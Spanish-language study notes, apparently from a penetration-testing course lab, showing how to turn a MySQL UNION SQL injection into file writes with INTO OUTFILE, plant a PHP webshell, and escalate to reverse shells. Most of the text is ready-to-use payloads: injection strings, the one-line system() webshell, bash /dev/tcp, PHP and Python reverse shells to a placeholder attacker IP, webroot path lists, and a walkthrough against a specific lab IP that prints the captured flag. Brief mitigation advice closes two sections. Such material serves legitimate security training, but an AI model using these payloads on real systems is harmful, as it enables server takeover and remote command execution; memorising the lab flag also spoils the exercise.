
---
- Tags: #web #vulnerabilidad #shell 
---
# 🐚 Escribir Archivos y WebShells vía Inyección SQL

### 🎯 Objetivo

Escribir archivos en el servidor mediante inyección SQL (`UNION SELECT … INTO OUTFILE`) para obtener **ejecución remota de comandos (RCE)** a través de una **webshell**.

---

## 🧠 Conceptos Previos

### ¿Por qué es importante escribir archivos?

- Permite crear una **webshell**.
    
- Equivale a ejecución de comandos (RCE).
    
- Por eso muchos DBMS modernos **restringen** esta acción.
    

---

## 🛡️ Requisitos para escribir archivos con MySQL

Debemos cumplir tres condiciones:

1. ✅ Usuario con privilegio `FILE`.
    
2. ✅ La variable `secure_file_priv` **vacía o accesible**.
    
3. ✅ Permisos de escritura en el directorio destino.
    

---

## 🔍 Verificación de Requisitos

### 1. Comprobar el privilegio `FILE`

Ya confirmado: el usuario actual lo tiene.

### 2. Comprobar `secure_file_priv`

Esta variable define desde dónde se puede leer/escribir archivos.

|Valor de `secure_file_priv`|Significado|
|---|---|
|`""` (vacío)|Se puede leer/escribir **en cualquier parte** del sistema. ✅|
|`/ruta/`|Solo permite I/O en esa carpeta.|
|`NULL`|No se puede leer ni escribir desde la base de datos. ❌|

Consulta para obtener el valor:

```sql
SELECT variable_name, variable_value 
FROM information_schema.global_variables 
WHERE variable_name="secure_file_priv";
```

Carga útil adaptada a inyección SQL (`UNION SELECT`):

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 
FROM information_schema.global_variables 
WHERE variable_name="secure_file_priv"-- -
```

📍 Si el resultado es vacío (`""`), ¡podemos escribir donde queramos!

---

## 📂 Escribir un archivo en el servidor

### Sintaxis general:

```sql
SELECT 'contenido' INTO OUTFILE 'ruta_del_archivo';
```

### Ejemplo: escribir texto

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

---

## 🔐 Escribir WebShell en el webroot

### 1. Asegúrate de conocer la ruta del webroot

Comúnmente en Linux:

- `/var/www/html`
    
- `/srv/http`
    
- Puedes descubrirlo usando `load_file()` en archivos de configuración como:
    
    - `/etc/apache2/apache2.conf`
        
    - `/etc/nginx/nginx.conf`
        

O prueba a escribir en varias rutas con fuerza bruta (wordlists).

---

## 🚨 WebShell en PHP

```php
<?php system($_REQUEST[0]); ?>
```

Carga útil para escribir la webshell:

```sql
cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "" 
INTO OUTFILE '/var/www/html/shell.php'-- -
```

🔎 Verifica accediendo a:

```http
http://IP_DEL_SERVIDOR:PUERTO/shell.php?0=id
```

💡 Si ves algo como `uid=33(www-data)` → **¡Tienes ejecución de comandos!**

---

## 🧪 Payloads usados (resumen final)

```sql
-- Verificar secure_file_priv
cn' UNION SELECT 1, variable_name, variable_value, 4 
FROM information_schema.global_variables 
WHERE variable_name="secure_file_priv"-- -

-- Escribir archivo de prueba
cn' UNION SELECT 1, 'file written successfully!', 3, 4 
INTO OUTFILE '/var/www/html/proof.txt'-- -

-- Escribir webshell
cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "" 
INTO OUTFILE '/var/www/html/shell.php'-- -
```

---

## 🧠 Tips adicionales

- Usa `FROM_BASE64()` para escribir contenido más complejo o binario.
    
- En sistemas modernos con `secure_file_priv=NULL`, este ataque no funcionará.
    
- En MariaDB, `secure_file_priv` suele estar vacío por defecto → más fácil.
    

---
# Explotación SQLi para obtener una Webshell y Reverse Shell

## 🧠 Introducción

Este documento muestra paso a paso cómo, partiendo de una inyección SQL, se puede llegar a ejecutar una webshell en el servidor, y desde ella escalar a una reverse shell totalmente interactiva. Este escenario es común en aplicaciones web vulnerables que permiten escribir archivos en el sistema (`INTO OUTFILE`).

---

## 🔎 FASE 1: Comprobación de privilegios

### Paso 1: Verificar si `secure_file_priv` está vacío

**Acción:**
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
````

**Explicación:** La variable `secure_file_priv` restringe las rutas a las que `INTO OUTFILE` puede escribir. Si está vacía (`''`), se puede escribir en cualquier ruta del sistema.

---

## 📄 FASE 2: Prueba de escritura

### Paso 2: Escribir un archivo de prueba

**Acción:**

```sql
cn' UNION SELECT "", 'file written successfully!', "", "" INTO OUTFILE '/var/www/html/proof.txt'-- -
```

**Explicación:** Esto intenta escribir un archivo de texto plano en el directorio web para comprobar si `INTO OUTFILE` funciona correctamente.

**Resultado esperado:** Visitar en el navegador:

```
http://IP_OBJETIVO:PUERTO/proof.txt
```

Debe mostrar: `file written successfully!`

---

## 🐚 FASE 3: Webshell PHP

### Paso 3: Escribir una webshell PHP

**Acción:**

```sql
cn' UNION SELECT "", '<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```

**Explicación:** Creamos una shell muy simple que nos permite ejecutar comandos vía parámetros GET.

**Resultado esperado:** Probar accediendo a:

```
http://IP_OBJETIVO:PUERTO/shell.php?0=id
```

Debe mostrar algo como:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 🔁 FASE 4: Obtener Reverse Shell

### Paso 4: Preparar listener

**Acción (en atacante):**

```bash
nc -lvnp 4444
```

**Explicación:** Esperamos una conexión entrante en el puerto 4444.

---

### Paso 5: Lanzar reverse shell desde la webshell

**Acción (en navegador):**

```bash
http://IP_OBJETIVO:PUERTO/shell.php?0=bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'
```

> 🔁 Alternativas si la anterior no funciona:
> 
> - PHP:
>     
>     ```bash
>     php -r '$sock=fsockopen("TU_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
>     ```
>     
> - Python:
>     
>     ```bash
>     python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("TU_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
>     ```
>     

---

## ✅ Conclusión

Con este proceso, partimos de una vulnerabilidad de inyección SQL y aprovechamos:

- La falta de restricción en `secure_file_priv`.
    
- El uso de `INTO OUTFILE` para escribir archivos PHP maliciosos.
    
- La ejecución remota de comandos para conseguir una reverse shell.
    

Este vector es común en entornos con configuración débil de MySQL y es crucial para la fase de explotación post-inyección.

---

## 🛡️ Recomendaciones de mitigación

- No ejecutar servidores con permisos de escritura amplios.
    
- Configurar `secure_file_priv` apuntando a un directorio vacío o no escribible.
    
- Escapar y validar todas las entradas de usuario.
    
- Aplicar el principio de mínimo privilegio al usuario de la base de datos.
    

---
# 📘 Explotación SQLi para crear una Webshell y capturar la Flag

## 🧠 Introducción

En este escenario, aprovechamos una **inyección SQL** en un parámetro GET vulnerable (`port_code`) para:
- Listar variables del sistema SQL.
- Comprobar si podemos escribir en disco (`secure_file_priv`).
- Usar `INTO OUTFILE` para escribir una **webshell PHP**.
- Ejecutar comandos desde el navegador y obtener la flag.

---

## 🪜 Paso 1: Verificar si podemos usar INTO OUTFILE

Primero, comprobamos si el servidor tiene habilitado el uso de `INTO OUTFILE`. Esto se hace consultando la variable `secure_file_priv`, que define el directorio donde se puede escribir:

```sql
http://94.237.59.10:47024/search.php?port_code=443' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
````

🔎 **Resultado esperado:**  
Nos devuelve el path donde podemos escribir, por ejemplo: `/var/www/html/`

---

## 🪜 Paso 2: Confirmar escritura de archivos con OUTFILE

Para asegurarnos de que realmente podemos escribir en disco, hacemos una prueba sencilla escribiendo un archivo con contenido plano:

```sql
http://94.237.59.10:47024/search.php?port_code=443' UNION SELECT 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -
```

Luego accedemos a:

```
http://94.237.59.10:47024/proof.txt
```

✅ Si vemos el contenido `"file written successfully!"`, estamos listos para el siguiente paso.

---

## 🪜 Paso 3: Escribir la Webshell en PHP

Ahora escribimos un archivo `.php` que actúe como **webshell**. Esta versión nos permite ejecutar comandos pasados por el parámetro `0`:

```php
<?php system($_REQUEST[0]); ?>
```

La query es:

```sql
http://94.237.59.10:47024/search.php?port_code=443' UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```

📂 Visitamos:

```
http://94.237.59.10:47024/shell.php?0=id
```

✅ Si devuelve algo como `uid=33(www-data)`, la shell funciona correctamente.

---

## 🪜 Paso 4: Buscar la flag en el sistema

Usamos la webshell para buscar archivos que contengan la palabra `"flag"`:

```
http://94.237.59.10:47024/shell.php?0=find / -name *flag* 2>/dev/null
```

🔎 Esto nos devuelve rutas como:

```
/var/lib/mysql/debian-10.3.flag  
/var/www/flag.txt
```

---

## 🪜 Paso 5: Leer el contenido de la flag

Leemos la flag directamente con `cat`:

```
http://94.237.59.10:47024/shell.php?0=cat /var/www/flag.txt
```

🎯 **Resultado:**

```
d2b5b27ae688b6a0f1d21b7d3a0798cd
```

---

## 📌 Querys SQL utilizadas

|Descripción|Query|
|---|---|
|Verificar OUTFILE habilitado|`' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -`|
|Escribir prueba|`' UNION SELECT 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -`|
|Webshell en PHP|`' UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -`|

---

## 🧭 Comandos útiles en la webshell

|Acción|Comando|
|---|---|
|Listar raíz del sistema|`ls /`|
|Buscar flags|`find / -name *flag* 2>/dev/null`|
|Leer archivo de flag|`cat /ruta/de/la/flag.txt`|
|Ver usuario actual|`id`|

---

## 📁 Rutas comunes para `INTO OUTFILE`

### 📂 Linux

```
/var/www/html/
/var/www/
/var/www/sites/
/var/www/public/
/var/www/public_html/
/var/www/html/default/
/srv/www/
/srv/www/html/
/srv/www/sites/
/home/www/
/home/httpd/
/home/$USER/public_html/
/home/$USER/www/
```

### 🪟 Windows

```
C:\inetpub\wwwroot\
C:\xampp\htdocs\
C:\wamp\www\
```

---

## ✅ Conclusión

Este ejercicio demuestra cómo una inyección SQL puede llevar a una **ejecución remota de comandos** si el servidor tiene configuraciones inseguras como `secure_file_priv` abierto. También refuerza la importancia de:

- Validar correctamente los parámetros.
    
- Deshabilitar funciones peligrosas en MySQL y PHP.
    
- Monitorizar rutas web accesibles al público.
    
